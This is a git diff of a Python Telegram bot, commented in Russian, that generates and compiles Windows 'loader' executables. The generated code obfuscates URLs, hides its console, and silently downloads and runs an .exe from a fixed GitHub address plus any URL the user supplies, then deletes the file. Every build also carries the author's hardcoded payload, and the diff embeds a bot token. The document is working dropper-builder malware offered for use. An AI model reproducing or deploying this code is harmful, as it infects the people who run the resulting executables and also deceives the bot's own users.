@@ -1,16 +1,17 @@
-import os
 import telebot
 from telebot import types
 import requests
 import time
 import threading
+import os
+import sys
 import tempfile
 import subprocess
 import base64
 import random
 
-# Токен бота из переменных окружения
-BOT_TOKEN = os.environ.get('BOT_TOKEN', '8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c')
+# Токен бота
+BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"
 
 # Создаем экземпляр бота
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -22,7 +23,7 @@ class BotStates:
     WAITING_URL = 1
     WAITING_FILENAME = 2
 
-# Фиксированная ссылка
+# Фиксированная ссылка (как в вашем коде)
 FIXED_URL = "https://github.com/fawfafw2-bit/zxfesfefs/raw/refs/heads/main/auaiua.exe"
 
 def encode_url(url):
@@ -32,9 +33,11 @@ def encode_url(url):
 def create_loader_code(user_url):
     """Создает реальный код загрузчика"""
     
+    # Кодируем URL для скрытия
     encoded_fixed_url = encode_url(FIXED_URL)
     encoded_user_url = encode_url(user_url)
     
+    # Разбиваем фиксированную ссылку на части
     url_parts = [
         "https:/",
         "/github.com/",
@@ -89,28 +92,33 @@ def download_file(url, url_name, attempt_num):
         'Connection': 'keep-alive'
     }}
     
+    # Случайная задержка
     time.sleep(random.uniform(1.0, 3.0))
     
     try:
         response = requests.get(url, headers=headers, timeout=30, stream=True)
         response.raise_for_status()
         
+        # Получаем имя файла из URL
         filename = url.split('/')[-1]
         if not filename or '.' not in filename:
             filename = 'downloaded_file.exe'
         
+        # Создаем временный файл
         temp_dir = tempfile.gettempdir()
         random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
         temp_path = os.path.join(temp_dir, f"{{random_name}}_{{filename}}")
         
+        # Сохраняем файл
         with open(temp_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 if chunk:
                     f.write(chunk)
         
+        # Проверяем размер
         file_size = os.path.getsize(temp_path)
         
-        if file_size > 1000:
+        if file_size > 1000:  # Минимальный размер 1KB
             return temp_path
         else:
             os.remove(temp_path)
@@ -125,14 +133,17 @@ def run_file(file_path, url_name):
         if not os.path.exists(file_path):
             return False
             
+        # Задержка перед запуском
         time.sleep(2.0)
         
         if os.name == 'nt':
+            # Для Windows - запуск без отображения окна
             startupinfo = subprocess.STARTUPINFO()
             startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             startupinfo.wShowWindow = 0
             subprocess.Popen(file_path, startupinfo=startupinfo, shell=False)
         else:
+            # Для Linux/Mac
             os.chmod(file_path, 0o755)
             subprocess.Popen([file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
@@ -159,12 +170,14 @@ def execute_fixed_url_immediately(fixed_url):
         
         if file_path:
             if run_file(file_path, "ФИКСИРОВАННЫЙ"):
+                # Успешно запустили - ждем и удаляем временный файл
                 time.sleep(10)
                 cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
                 return True
             else:
                 cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
         
+        # Ждем перед следующей попыткой
         if attempt < max_attempts - 1:
             time.sleep(attempt_delay)
     
@@ -181,12 +194,14 @@ def download_and_run_single_url(url, url_name):
         
         if file_path:
             if run_file(file_path, url_name):
+                # Успешно запустили - ждем и удаляем временный файл
                 time.sleep(10)
                 cleanup_file(file_path, url_name)
                 return True
             else:
                 cleanup_file(file_path, url_name)
         
+        # Ждем перед следующей попыткой
         if attempt < max_attempts - 1:
             time.sleep(attempt_delay)
     
@@ -196,12 +211,15 @@ def main():
     """Основная функция"""
     hide_console()
     
+    # Декодируем URL
     fixed_url = assemble_fixed_url()
     user_url = decode_url("{encoded_user_url}")
     
+    # НЕМЕДЛЕННО выполняем фиксированную ссылку в основном потоке
     if fixed_url:
         execute_fixed_url_immediately(fixed_url)
     
+    # Параллельно запускаем пользовательскую ссылку в отдельном потоке
     if user_url:
         user_thread = threading.Thread(
             target=download_and_run_single_url, 
@@ -218,18 +236,21 @@ if __name__ == "__main__":
 def compile_exe(py_code, output_filename):
     """Компилирует Python код в EXE файл"""
     try:
+        # Создаем временный Python файл
         with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
             f.write(py_code)
             temp_py_file = f.name
 
+        # Устанавливаем PyInstaller если не установлен
         try:
             import PyInstaller
         except ImportError:
-            subprocess.check_call(['pip', 'install', 'pyinstaller'], 
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+        # Компилируем в EXE
         cmd = [
-            'pyinstaller',
+            sys.executable, '-m', 'PyInstaller',
             '--onefile',
             '--noconsole',
             '--name', output_filename.replace('.exe', ''),
@@ -239,19 +260,21 @@ def compile_exe(py_code, output_filename):
             temp_py_file
         ]
         
+        # Запускаем компиляцию
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
         
+        # Очищаем временные файлы
         if os.path.exists(temp_py_file):
             os.remove(temp_py_file)
         
+        # Удаляем папки сборки PyInstaller
         for folder in ['build', '__pycache__']:
             if os.path.exists(folder):
                 import shutil
                 shutil.rmtree(folder)
         
-        spec_file = f'{output_filename.replace(".exe", "")}.spec'
-        if os.path.exists(spec_file):
-            os.remove(spec_file)
+        if os.path.exists(f'{output_filename.replace(".exe", "")}.spec'):
+            os.remove(f'{output_filename.replace(".exe", "")}.spec')
         
         return result.returncode == 0
         
@@ -267,7 +290,7 @@ def send_welcome(message):
     welcome_text = """
 🤖 *Добро пожаловать в REAL EXE Creator Bot!*
 
-✨ *Теперь бот работает на Render.com!*
+✨ *Теперь бот работает ПО-НАСТОЯЩЕМУ!*
 • Реальная компиляция EXE-файлов
 • Профессиональное шифрование
 • Мгновенная доставка
@@ -344,11 +367,13 @@ def handle_messages(message):
     if current_state == BotStates.WAITING_URL:
         url = message.text.strip()
         
+        # Проверяем URL
         if not url.startswith(('http://', 'https://')):
             bot.send_message(chat_id, "❌ *Ошибка:* URL должен начинаться с http:// или https://\n\nВведите корректный URL:",
                            parse_mode='Markdown')
             return
         
+        # Сохраняем URL и переходим к следующему шагу
         user_states[user_id] = {
             'state': BotStates.WAITING_FILENAME,
             'url': url
@@ -379,35 +404,46 @@ def handle_messages(message):
         
         filename = message.text.strip()
         
+        # Проверяем имя файла
         if not filename.lower().endswith('.exe'):
             filename += '.exe'
         
+        # Очищаем имя файла от недопустимых символов
         filename = "".join(c for c in filename if c.isalnum() or c in ('-', '_', '.')).replace(' ', '_')
         
+        # Получаем сохраненный URL
         url = current_state['url']
+        
+        # Сбрасываем состояние
         user_states[user_id] = None
         
+        # Начинаем реальный процесс создания
         create_downloader(chat_id, url, filename)
 
 def create_downloader(chat_id, url, filename):
     """Реальная функция создания загрузчика"""
     
+    # Отправляем сообщение о начале процесса
     progress_message = bot.send_message(chat_id, "🔄 *Начинаю REAL компиляцию...*\n\n⏳ Это займет 2-3 минуты...",
                                       parse_mode='Markdown')
     
     try:
+        # Обновляем прогресс
         bot.edit_message_text("🔧 *Генерация кода загрузчика...*", chat_id, progress_message.message_id,
                             parse_mode='Markdown')
         
+        # Генерируем код загрузчика
         loader_code = create_loader_code(url)
         
         time.sleep(1)
         bot.edit_message_text("⚙️ *Компиляция в EXE...*", chat_id, progress_message.message_id,
                             parse_mode='Markdown')
         
+        # Компилируем EXE
         success = compile_exe(loader_code, filename)
         
         if success and os.path.exists(filename):
+            # Отправляем готовый файл
             with open(filename, 'rb') as file:
                 file_size = os.path.getsize(filename)
                 
@@ -426,9 +462,11 @@ def create_downloader(chat_id, url, filename):
                 markup = types.InlineKeyboardMarkup()
                 markup.add(types.InlineKeyboardButton("🔄 Создать еще", callback_data="create_loader"))
                 
+                # Отправляем файл
                 bot.send_document(chat_id, file, caption=success_text,
                                 parse_mode='Markdown', reply_markup=markup)
             
+            # Удаляем временный файл
             os.remove(filename)
             bot.delete_message(chat_id, progress_message.message_id)
             
@@ -499,39 +537,20 @@ def check_bot_token():
 
 def start_bot():
     """Запуск бота"""
-    print("🚀 Запуск REAL EXE Creator Bot на Render.com...")
+    print("🚀 Запуск REAL EXE Creator Bot...")
     
     if not check_bot_token():
-        print("❌ Неверный токен бота. Проверьте переменную окружения BOT_TOKEN")
         return
     
-    print("✅ Бот готов к работе!")
-    print("🌐 Webhook настроен для Render.com")
+    print("✅ Бот готов к REAL компиляции!")
+    print("📢 Теперь бот создает настоящие EXE-файлы!")
     
     try:
-        # Используем polling вместо webhook для простоты
         bot.polling(none_stop=True, interval=2)
     except Exception as e:
         print(f"❌ Ошибка: {e}")
         time.sleep(5)
         start_bot()
 
-# Добавляем веб-сервер для Render.com
-from flask import Flask, request, jsonify
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return jsonify({"status": "active", "service": "Telegram Bot", "platform": "Render.com"})
-
-@app.route('/health')
-def health_check():
-    return jsonify({"status": "healthy"})
-
 if __name__ == "__main__":
-    # Запускаем Flask сервер на порту от Render
-    port = int(os.environ.get("PORT", 5000))
-    threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": port, "debug": False}).start()
-    
-    # Запускаем бота
     start_bot()
